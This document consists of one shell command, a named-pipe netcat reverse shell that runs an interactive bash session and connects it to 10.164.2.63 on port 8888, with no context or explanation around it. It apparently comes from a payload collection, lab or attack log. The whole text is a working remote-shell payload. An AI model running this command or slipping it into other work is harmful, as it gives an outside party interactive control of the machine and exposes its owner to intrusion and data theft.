rm /tmp/f 2>/dev/null; mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc 10.164.2.63 8888 > /tmp/f
